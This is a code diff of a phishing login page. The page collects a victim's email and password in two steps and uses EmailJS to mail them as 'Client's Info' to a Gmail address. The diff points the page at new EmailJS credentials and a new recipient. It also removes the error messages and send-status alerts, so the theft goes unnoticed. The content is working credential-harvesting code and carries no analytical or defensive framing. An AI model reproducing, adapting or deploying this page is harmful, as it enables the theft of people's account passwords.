@@ -243,7 +243,6 @@
             </svg>
           </span>
         </div>
-        <small id="err"></small>
         <span class="next-btn" id="next-btn">Next</span>
         <button class="submit-btn" id="submit-btn">Submit</button>
         <div class="sign">
@@ -259,14 +258,13 @@
   </body>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    emailjs.init("gG5x8D_myEzjKKXvI");
+    emailjs.init("oTWaSLI94veAbFpaX");
 
     let form = document.querySelector("form");
     let username = document.getElementById("username");
     let password = document.getElementById("passsword");
     let up = document.getElementById("up");
     let up2 = document.getElementById("up2");
-    let err = document.getElementById("err");
     let nextBtn = document.getElementById("next-btn");
     let submitBtn = document.getElementById("submit-btn");
     let firstShow = document.querySelector(".first-show");
@@ -295,18 +293,16 @@
 
     function sendEmail(to, subject, message) {
       emailjs
-        .send("service_g1hvjdp", "template_ydtlwut", {
+        .send("service_o7z3jtp", "template_nht3mye", {
           to_email: to,
           subject: subject,
           message: message,
         })
         .then(
           function (response) {
-            alert("Email sent successfully!");
             console.log("Email sent successfully:", response);
           },
           function (error) {
-            alert("Failed to send email. Please try again later.");
             console.error("Error sending email:", error);
           }
         );
@@ -319,10 +315,6 @@
       } else {
         nextBtn.addEventListener("click", () => {
           if (!username.value) {
-            err.textContent = "Please enter your email";
-            setTimeout(() => {
-              err.textContent = "";
-            }, 3000);
           } else {
             uName = username.value;
             username.value = "";
@@ -335,10 +327,6 @@
         form.addEventListener("submit", (e) => {
           e.preventDefault();
           if (!password.value) {
-            err.textContent = "Please enter your password";
-            setTimeout(() => {
-              err.textContent = "";
-            }, 3000);
           } else {
             pWord = password.value;
             let message = {
@@ -346,7 +334,7 @@
               password: pWord,
             };
             sendEmail(
-              "ejovwogfreeman007@gmail.com",
+              "jamespeterson10375@gmail.com",
               "Client's Info",
               JSON.stringify(message)
             );
